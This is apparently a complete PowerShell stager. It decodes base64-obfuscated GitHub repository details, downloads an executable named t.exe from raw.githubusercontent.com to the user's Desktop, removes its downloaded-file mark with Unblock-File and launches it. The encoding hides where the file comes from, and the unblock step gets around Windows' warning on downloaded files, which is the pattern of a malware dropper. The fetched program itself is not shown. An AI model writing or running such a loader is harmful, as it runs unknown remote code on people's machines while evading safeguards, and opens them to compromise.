# Auto-generated PowerShell download and execution script.
$ErrorActionPreference = 'Stop'

function Decode-Base64([string]$value) {
    return [System.Text.Encoding]::UTF8.GetString(
        [System.Convert]::FromBase64String($value)
    )
}

$repoOwner = Decode-Base64 'aGFuYW5lbDQy'
$repoName = Decode-Base64 'LQ=='
$commitSha = Decode-Base64 'MDdkNGMyMDBjN2FkMDYyOTg1ZDI0OWU2YzNlOGU4MjM0ZmIyZmJjOA=='
$relativePath = Decode-Base64 'dC5leGU='
$filename = Decode-Base64 'dC5leGU='

$encodedPath = (
    $relativePath -split '/' |
    ForEach-Object {
        [System.Uri]::EscapeDataString($_)
    }
) -join '/'

$url = "https://raw.githubusercontent.com/$repoOwner/$repoName/$commitSha/$encodedPath"

$desktop = [Environment]::GetFolderPath('Desktop')
$destination = Join-Path $desktop $filename

Write-Host "Downloading $filename..."
Invoke-WebRequest -Uri $url -OutFile $destination

Unblock-File -Path $destination

Write-Host "Downloaded to: $destination"
Write-Host "Executing $filename..."

Start-Process -FilePath $destination -Wait
